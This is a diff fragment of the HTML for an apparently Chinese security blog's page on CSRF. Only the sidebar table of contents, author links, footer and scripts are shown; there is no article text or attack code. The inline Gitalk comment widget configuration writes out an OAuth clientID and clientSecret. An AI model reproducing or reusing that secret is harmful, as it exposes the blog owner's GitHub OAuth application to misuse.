+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、CSRF理解"><span class="nav-text">一、CSRF理解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、CSRF攻击原理及过程"><span class="nav-text">二、CSRF攻击原理及过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF攻击实例"><span class="nav-text">CSRF攻击实例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、CSRF攻击获取数据的方法"><span class="nav-text">三、CSRF攻击获取数据的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）同域内"><span class="nav-text">（一）同域内</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）跨域"><span class="nav-text">（二）跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、检测方法"><span class="nav-text">四、检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#以-CSRFTester-工具为例"><span class="nav-text">以 CSRFTester 工具为例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、CSRF利用"><span class="nav-text">五、CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）GET类型CSRF"><span class="nav-text">（一）GET类型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）POST型CSRF"><span class="nav-text">（二）POST型CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）其他利用"><span class="nav-text">（三）其他利用</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/dxx.jpg"
+      alt="xx_C1">
+  <p class="site-author-name" itemprop="name">xx_C1</p>
+  <div class="site-description" itemprop="description">Cyberspace Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/xx-C1" title="GitHub &rarr; https://github.com/xx-C1"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:iduxinxing@gmail.com" title="E-Mail &rarr; mailto:iduxinxing@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https://p0sec.net/" rel="noopener" target="_blank">p0</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://seaii-blog.com/" title="https://seaii-blog.com/" rel="noopener" target="_blank">seaii</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://syf.ac.cn/" title="http://syf.ac.cn/" rel="noopener" target="_blank">7N1ght</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.windylh.com/" title="https://www.windylh.com/" rel="noopener" target="_blank">windylh</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://zhengbao.wang" title="http://zhengbao.wang" rel="noopener" target="_blank">Boogle</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://v0w.top" title="https://v0w.top" rel="noopener" target="_blank">vOw</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://ttonys.github.io/" title="https://ttonys.github.io/" rel="noopener" target="_blank">tongs</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://daolgts.github.io" title="https://daolgts.github.io" rel="noopener" target="_blank">daolgts</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://j0k3r.top/" title="http://j0k3r.top/" rel="noopener" target="_blank">joker</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://wzt.ac.cn/" title="https://wzt.ac.cn/" rel="noopener" target="_blank">CataLpa</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://asa9ao.xyz/" title="http://asa9ao.xyz/" rel="noopener" target="_blank">Asa9ao</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xx_C1</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">119k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:19</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.1</div>
+-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'e359eec42038f3a7de62',
+      clientSecret: '307c95e8834b62ce80a30e3b9b3ad850eee61b74',
+      repo: 'gitalk-comment',
+      owner: 'xx-C1',
+      admin: ['xx-C1'],
+      id: 'bc773e08d4152c495a7f79beda352a6f',
+        language: 'zh-CN',
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":80,"height":132},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
